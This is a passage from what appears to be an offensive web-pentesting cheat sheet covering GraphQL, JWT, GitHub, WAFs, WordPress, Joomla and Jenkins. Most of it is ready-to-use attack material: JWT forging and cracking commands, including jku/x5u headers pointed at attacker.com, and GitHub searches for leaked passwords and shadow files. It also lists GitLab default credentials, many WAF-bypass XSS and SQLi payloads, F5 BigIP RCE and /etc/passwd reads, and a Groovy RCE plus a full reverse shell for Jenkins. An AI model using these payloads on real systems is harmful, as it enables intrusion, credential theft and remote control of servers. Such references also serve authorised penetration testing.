&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   comments{
&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   comment
 &amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;       user{
 &amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;&amp;amp;amp;nbsp;   ...
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
</code></pre>
<h3 id="tips"><a class="header" href="#tips">Tips</a></h3>
<pre><code># Easy to enumeration

# Create {createPost(...)}
# Read {post(id:"1"){id,..}}
# Update {updatePost(...)}
# Delete {deletePost(...)}

To test a server for GraphQL introspection misconfiguration: 
1) Intercept the HTTP request being sent to the server 
2) Replace its post content / query with a generic introspection query to fetch the entire backend schema 
3) Visualize the schema to gather juicy API calls. 
4) Craft any potential GraphQL call you might find interesting and HACK away!

example.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}

XSS in GraphQL:
http://localhost:4000/example-1?id=%3C/script%3E%3Cscript%3Ealert('I%20%3C3%20GraphQL.%20Hack%20the%20Planet!!')%3C/script%3E%3Cscript%3E
http://localhost:4000/example-3?id=%3C/script%3E%3Cscript%3Ealert('I%20%3C3%20GraphQL.%20Hack%20the%20Planet!!')%3C/script%3E%3Cscript%3E

# Introspection query
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
# Encoded
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="js-1"><a class="header" href="#js-1">JS</a></h1>
<pre><code class="language-text"># JSScanner
# https://github.com/dark-warlord14/JSScanner
# https://securityjunky.com/scanning-js-files-for-endpoint-and-secrets/
bash install.sh
# Configure domain in alive.txt
bash script.sh
cat js/*
cd db &amp;&amp; grep -oriahE "https?://[^\"\\'&gt; ]+"

# https://github.com/KathanP19/JSFScan.sh
bash JSFScan.sh -l targets.txt -e -s -m -o 

# https://github.com/bp0lr/linkz

# FindSecrets in JS files
https://github.com/m4ll0k/SecretFinder
python3 SecretFinder.py -i https://example.com/1.js -o results.html

# Js vuln scanner, like retire.js with crawling
https://github.com/callforpapers-source/jshole

# get Shell from xss
https://github.com/shelld3v/JSshell

# Find JS sourcemap
1) Find JavaScript files
2) ffuf -w js_files.txt -u FUZZ -mr "sourceMappingURL"
3) Download sourcemap
4) https://github.com/chbrown/unmap
5) Browse configs or just grep for API keys/Creds
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aspnet"><a class="header" href="#aspnet">ASP.NET</a></h1>
<pre><code># Look for trace
example.com/trace.axd
example.com/any.aspx/trace.axd
</code></pre>
<p>https://www.securifera.com/blog/2023/03/06/attacking-net-web-services/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt"><a class="header" href="#jwt">JWT</a></h1>
<h2 id="tools-17"><a class="header" href="#tools-17">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/ticarpi/jwt_tool
# https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

# https://github.com/hahwul/jwt-hack
# https://github.com/mazen160/jwt-pwn
# https://github.com/mBouamama/MyJWT
# https://github.com/DontPanicO/jwtXploiter

# Test all common attacks
python3 jwt_tool.py -t https://url_that_needs_jwt/ -rh "Authorization: Bearer JWT" -M at -cv "Welcome user!"

# Hashcat
# dictionary attacks 
hashcat -a 0 -m 16500 jwt.txt passlist.txt
# rule-based attack  
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
# brute-force attack
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6


# Crack
pip install PyJWT
# https://github.com/Sjord/jwtcrack
# https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
jwt2john.py JWT
./john /tmp/token.txt --wordlist=wordlist.txt

# Wordlist generator crack tokens:
# https://github.com/dariusztytko/token-reverser

# RS256 to HS256
openssl s_client -connect www.google.com:443 | openssl x509 -pubkey -noout &gt; public.pem
cat public.pem | xxd -p | tr -d "\\n" &gt; hex.txt
# Sign JWT with hex.txt 

# Generate JWT from terminal
pip install pyjwt
python3 -c 'import jwt;print(jwt.encode({"role": "admin"},"SECRET",algorithm="HS256").decode("UTF-8"))'
</code></pre>
<h2 id="general-info-1"><a class="header" href="#general-info-1">General info</a></h2>
<pre><code>1. Leak Sensitive Info
2. Send without signature
3. Change algorythm r to h
4. Crack the secret h256
5. KID manipulation

eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1ODQ2NTk0MDAsInVzZXJuYW1lIjoidGVtcHVzZXI2OSIsInJvbGVzIjpbIlJPTEVfRVhURVJOQUxfVVNFUiJdLCJhcHBDb2RlIjoiQU5UQVJJX0FQSSIsImlhdCI6MTU4NDU3MzAwMH0.AOHXCcMFqYFeDSYCEjeugT26RaZLzPldqNAQSlPNpKc2JvdTG9dr2ini4Z42dd5xTBab-PYBvlXIJetWXOX80A

https://trustfoundry.net/jwt-hacking-101/
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9
https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a

- JKU &amp; X5U Headers - JWK
    - Header injection
    - Open redirect



- Remember test JWT after session is closed
</code></pre>
<h2 id="attacks-1"><a class="header" href="#attacks-1">Attacks</a></h2>
<h3 id="header"><a class="header" href="#header">Header</a></h3>
<pre><code># None algorithm
python3 jwt_tool.py &lt;JWT&gt; -X a

# From RS256 to HS256
python3 jwt_tool.py &lt;JWT&gt; -S hs256 -k public.pem

# Not checked signature
python3 jwt_tool.py &lt;JWT&gt; -I -pc name -pv admin

# Crack secret key
python3 jwt_tool.py &lt;JWT&gt; -C -d secrets.txt 

# Null kid
python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Use source file as kid to verify signature
python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"

# jku manipulation for open redirect
python3 jwt_tool.py &lt;JWT&gt; -X s -ju "https://attacker.com/jwttool_custom_jwks.json"

# x5u manipulation for open redirect
openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=CompanyName/CN=pentester"
python3 jwt_tool.py &lt;JWT&gt; -S rs256 -pr private.pem -I -hc x5u -hv "https://attacker.com/custom_x5u.json"
</code></pre>
<h3 id="payload"><a class="header" href="#payload">Payload</a></h3>
<pre><code># SQLi
python3 jwt_tool.py &lt;JWT&gt; -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem

# Manipulate other values to change expiration time or userID for example
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="github-1"><a class="header" href="#github-1">GitHub</a></h1>
<h2 id="tools-18"><a class="header" href="#tools-18">Tools</a></h2>
<pre><code># Dump GH repo
# githack
  https://github.com/OwenChia/githack
# Goop - Another dumper
  https://github.com/deletescape/goop
# GitDumper 
  https://github.com/internetwache/GitTools
  If we have access to .git folder: 
  ./gitdumper.sh http://example.com/.git/ /home/user/dump/
  ./extractor.sh /home/user/dump/ /home/user/dump_extracted 
# Extract secrets from the repo
# https://github.com/zricethezav/gitleaks#
  gitleaks detect /tmp/test -v
# https://github.com/trufflesecurity/trufflehog
  trufflehog filesystem --directory=/tmp/test  
  
  
  
# Manual way to extract blob's content:
  git cat-file --batch-check --batch-all-objects | grep blob
  git cat-file -p HASH
# GitGot 
  https://github.com/BishopFox/GitGot
  ./gitgot.py --gist -q CompanyName./gitgot.py -q '"example.com"'./gitgot.py -q "org:github cats"
# GitRob https://github.com/michenriksen/gitrob
  gitrob website.com
# GitHound https://github.com/tillson/git-hound 
  echo "domain.com" | githound --dig --many-results --languages common-languages.txt --threads 100
# GitGrabber https://github.com/hisxo/gitGraber
# SSH GIT https://shhgit.darkport.co.uk/
# GithubSearch
  https://github.com/gwen001/github-search
# Trufflehog
trufflehog https://github.com/Plazmaz/leaky-repo
trufflehog --regex --entropy=False https://github.com/Plazmaz/leaky-repo
# If you have public .git
https://github.com/HightechSec/git-scanner
# GitMiner
# wordpress configuration files with passwords
  python3 gitminer-v2.0.py -q 'filename:wp-config extension:php FTP\_HOST in:file ' -m wordpress -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 -o result.txt
# brasilian government files containing passwords
  python3 gitminer-v2.0.py --query 'extension:php "root" in:file AND "gov.br" in:file' -m senhas -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4
# shadow files on the etc paste
  python3 gitminer-v2.0.py --query 'filename:shadow path:etc' -m root -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4
# joomla configuration files with passwords 
  python3 gitminer-v2.0.py --query 'filename:configuration extension:php "public password" in:file' -m joomla -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4
  
# GitLeaks
sudo docker pull zricethezav/gitleaks
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
or (repository in /tmp)
sudo docker run --rm --name=gitleaks -v /tmp/:/code/ zricethezav/gitleaks -v --repo-path=/code/repository

# GitJacker - for exposed .git paths
# https://github.com/liamg/gitjacker
curl -s "https://raw.githubusercontent.com/liamg/gitjacker/master/scripts/install.sh" | bash
gitjacker url.com

# Then visualize a commit:
https://github.com/[git account]/[repo name]/commit/[commit ID]
https://github.com/zricethezav/gitleaks/commit/744ff2f876813fbd34731e6e0d600e1a26e858cf

# Manual local checks inside repository
git log
# Checkout repo with .env file
git checkout f17a07721ab9acec96aef0b1794ee466e516e37a
ls -la
cat .env

# Find websites from GitHub
https://github.com/Orange-Cyberdefense/versionshaker
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gitlab"><a class="header" href="#gitlab">GitLab</a></h1>
<pre><code>Default credentials:
Username: root &amp; pass: 5iveL!fe 
Username: admin &amp; Pass: 5iveL!fe

If you find GitLab login panel, try to go to:
/explore
Then use the searchbar for users,passwords,keys..
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="wafs"><a class="header" href="#wafs">WAFs</a></h1>
<p>https://waf-bypass.com</p>
<h2 id="tools-19"><a class="header" href="#tools-19">Tools</a></h2>
<pre><code>whatwaf https://example.com
wafw00f https://example.com

# https://github.com/vincentcox/bypass-firewalls-by-DNS-history
bash bypass-firewalls-by-DNS-history.sh -d example.com

# Bypasser
# https://github.com/RedSection/pFuzz
# https://github.com/nemesida-waf/waf-bypass

# Domain IP history
https://viewdns.info/iphistory/

# Bypasses and info
https://github.com/0xInfection/Awesome-WAF
https://github.com/waf-bypass-maker/waf-community-bypasses
</code></pre>
<pre><code># Manual identification
dig +short target.com
curl -s https://ipinfo.io/&lt;ip address&gt; | jq -r '.com'

# Always check DNS History for original IP leak
https://whoisrequest.com/history/

# Waf detection
nmap --script=http-waf-fingerprint victim.com
nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 victim.com
nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro " victim.com
wafw00f victim.com

# Good bypass payload:
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
javascript:”/*’/*`/* →&lt;html \” onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;

# Bypass trying to access to :
dev.domain.com
stage.domain.com
ww1/ww2/ww3...domain.com
www.domain.uk/jp/

# Akamai
origin.sub.domain.com
origin-sub.domain.com
- Send header:
Pragma: akamai-x-get-true-cache-key
{{constructor.constructor(alert`1`)()}}
\');confirm(1);//
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#

# ModSecurity Bypass
&lt;img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)&gt;

# Cloudflare
python3 cloudflair.py domain.com
# https://github.com/mandatoryprogrammer/cloudflare_enum
cloudflare_enum.py disney.com
https://viewdns.info/iphistory/?domain=domain.com
https://whoisrequest.com/history/

# Cloudflare bypasses
&lt;!&lt;script&gt;alert(1)&lt;/script&gt;
&lt;a href=”j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;\u0061\u006C\u0065\u0072\u0074&amp;lpar;this[‘document’][‘cookie’]&amp;rpar;”&gt;X&lt;/a&gt;
&lt;img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert'1';&gt;
&lt;select&gt;&lt;noembed&gt;&lt;/select&gt;&lt;script x='a@b'a&gt;y='a@b'//a@b%0a\u0061lert(1)&lt;/script x&gt;
&lt;a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’&gt;

# Aqtronix WebKnight WAF
- SQLi
0 union(select 1,@@hostname,@@datadir)
0 union(select 1,username,password from(users))
- XSS
&lt;details ontoggle=alert(document.cookie)&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;

# ModSecurity
- XSS
&lt;scr%00ipt&gt;alert(document.cookie)&lt;/scr%00ipt&gt;
onmouseover%0B=
ontoggle%0B%3D
&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(“123”)&gt;
- SQLi
1+uni%0Bon+se%0Blect+1,2,3

# Imperva Incapsula
https://medium.com/@0xpegg/imperva-waf-bypass-96360189c3c5
url.com/search?search=%3E%3C/span%3E%3Cp%20onmouseover=%27p%3D%7E%5B%5D%3Bp%3D%7B%5F%5F%5F%3A%2B%2Bp%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%5F%24%3A%2B%2Bp%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%24%5F%3A%2B%2Bp%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%24%3A%28p%5Bp%5D%2B%22%22%29%5Bp%5D%2C%5F%24%24%3A%2B%2Bp%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5Bp%5D%2C%24%5F%5F%3A%2B%2Bp%2C%24%5F%24%3A%2B%2Bp%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%3A%2B%2Bp%2C%24%24%24%3A%2B%2Bp%2C%24%5F%5F%5F%3A%2B%2Bp%2C%24%5F%5F%24%3A%2B%2Bp%7D%3Bp%2E%24%5F%3D%28p%2E%24%5F%3Dp%2B%22%22%29%5Bp%2E%24%5F%24%5D%2B%28p%2E%5F%24%3Dp%2E%24%5F%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%24%24%3D%28p%2E%24%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28%28%21p%29%2B%22%22%29%5Bp%2E%5F%24%24%5D%2B%28p%2E%5F%5F%3Dp%2E%24%5F%5Bp%2E%24%24%5F%5D%29%2B%28p%2E%24%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%5F%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%5F%5D%29%2Bp%2E%24%5F%5Bp%2E%24%5F%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%24%2Bp%2E%24%3Bp%2E%24%24%3Dp%2E%24%2B%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%2Bp%2E%24%2Bp%2E%24%24%3Bp%2E%24%3D%28p%2E%5F%5F%5F%29%5Bp%2E%24%5F%5D%5Bp%2E%24%5F%5D%3Bp%2E%24%28p%2E%24%28p%2E%24%24%2B%22%5C%22%22%2Bp%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%24%24%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2Bp%2E%5F%5F%2B%22%28%5C%5C%5C%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%5F%2Bp%2E%24%24%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%5F%24%2B%22%2C%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%24%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%5F%24%24%2Bp%2E%24%24%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%5F%24%2Bp%2E%5F%5F%24%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%5F%5F%2Bp%2E%5F%5F%2B%22%5C%5C%5C%22%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3B%27%3E
&lt;iframe/onload='this["src"]="javas&amp;Tab;cript:al"+"ert``"';&gt;
&lt;img/src=q onerror='new Function`al\ert\`1\``'&gt;
- Parameter pollution SQLi
http://www.website.com/page.asp?a=nothing'/*&amp;a=*/or/*&amp;a=*/1=1/*&amp;a=*/--+-
http://www.website.com/page.asp?a=nothing'/*&amp;a%00=*/or/*&amp;a=*/1=1/*&amp;a%00=*/--+-
-XSS
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
&lt;img/src="x"/onerror="[7 char payload goes here]"&gt;

# FAIL2BAN SQLi
(SELECT 6037 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

# F5 BigIP
RCE: curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
Read File: curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
- XSS
&lt;body style="height:1000px" onwheel=alert(“123”)&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow=alert(“123”)&gt;
&lt;body style="height:1000px" onwheel="[JS-F**k Payload]"&gt; 
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[JS-F**k Payload]"&gt;
(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[]
)[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[
+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![
]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[
]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]
&lt;body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" on-
show="prom%25%32%33%25%32%36x70;t(1)"&gt;

# More payloads
https://github.com/Walidhossain010/WAF-bypass-xss-payloads

# Wordfence
&lt;meter onmouseover="alert(1)"
'"&gt;&gt;&lt;div&gt;&lt;meter onmouseover="alert(1)"&lt;/div&gt;"
&gt;&gt;&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;

# RCE WAF globbing bypass
/usr/bin/cat /etc/passwd ==  /???/???/c?t$IFS/???/p?s?w?
cat /etc$u/p*s*wd$u
</code></pre>
<p><img src="enumeration/webservices/../../.gitbook/assets/image%20(28).png" alt="" /></p>
<p><img src="enumeration/webservices/../../.gitbook/assets/image%20(13).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="firebird"><a class="header" href="#firebird">Firebird</a></h1>
<h2 id="tools-20"><a class="header" href="#tools-20">Tools</a></h2>
<pre><code class="language-text"># https://github.com/InfosecMatter/Scripts/blob/master/firebird-bruteforce.sh 
./firebird\_bruteforce.sh IP DB /PATH/pwdlist.txt

# https://www.infosecmatter.com/firebird-database-exploitation/
apt-get -y install firebird3.0-utils
isql-fb
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="wordpress"><a class="header" href="#wordpress">Wordpress</a></h1>
<h2 id="tools-21"><a class="header" href="#tools-21">Tools</a></h2>
<pre><code># https://github.com/wpscanteam/wpscan
wpscan --url https://url.com

</code></pre>
<pre><code># Check IP behing WAF:
https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/

# SQLi in WP and can't crack users hash:
1. Request password reset.
2. Go to site.com/wp-login.php?action=rp&amp;key={ACTIVATION_KEY}&amp;login={USERNAME}

# XMLRPC
# https://github.com/nullfil3/xmlrpc-scan
# https://github.com/relarizky/wpxploit
# https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

# pingback.xml:
&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
 &lt;param&gt;
  &lt;value&gt;
   &lt;string&gt;http://10.0.0.1/hello/world&lt;/string&gt;
  &lt;/value&gt;
 &lt;/param&gt;
 &lt;param&gt;
  &lt;value&gt;
   &lt;string&gt;https://10.0.0.1/hello/world/&lt;/string&gt;
  &lt;/value&gt;
 &lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;

&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;
&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodCall&gt;

# List methods:
&lt;methodCall&gt;
&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
&lt;params&gt;&lt;/params&gt;
&lt;/methodCall&gt;

curl -X POST -d @pingback.xml https://exmaple.com/xmlrpc.php

# Evidence xmlrpc:
curl -d '&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;&lt;methodCall&gt;&lt;methodName&gt;demo.sayHello&lt;/methodName&gt;&lt;params/&gt;&lt;/methodCall&gt;' -k https://example.com/xmlrpc.php

# Enum User:
for i in {1..50}; do curl -s -L -i https://example.com/wordpress?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
site.com/wp-json/wp/v2/users/

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="webdav"><a class="header" href="#webdav">WebDav</a></h1>
<pre><code class="language-text">davtest -cleanup -url http://target
cadaver http://target
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="joomla"><a class="header" href="#joomla">Joomla</a></h1>
<pre><code class="language-bash"># Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# Juumla
#https://github.com/knightm4re/juumla
python3 main.py -u https://example.com

droopescan scan joomla -u http://10.11.1.111
python3 cmseek.py -u domain.com
vulnx -u https://example.com/ --cms --dns -d -w -e
python3 cmsmap.py https://www.example.com -F

# nmap http-Joomla-brute

# Check common files
README.txt
htaccess.txt
web.config.txt
configuration.php
LICENSE.txt
administrator
administrator/index.php # Default admin login
index.php?option=&lt;nameofplugin&gt;
administrator/manifests/files/joomla.xml
plugins/system/cache/cache.xml
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jenkins"><a class="header" href="#jenkins">Jenkins</a></h1>
<pre><code class="language-text"># Tools
# dump_builds, offline_decryption &amp; password_spraying
# https://github.com/gquere/pwn_jenkins
# https://github.com/Accenture/jenkins-attack-framework

# URL's to check
JENKINSIP/PROJECT//securityRealm/user/admin
JENKINSIP/jenkins/script

# Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";

# Groovy RevShell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre>
<h2 id="common-bugs-1"><a class="header" href="#common-bugs-1">Common bugs</a></h2>
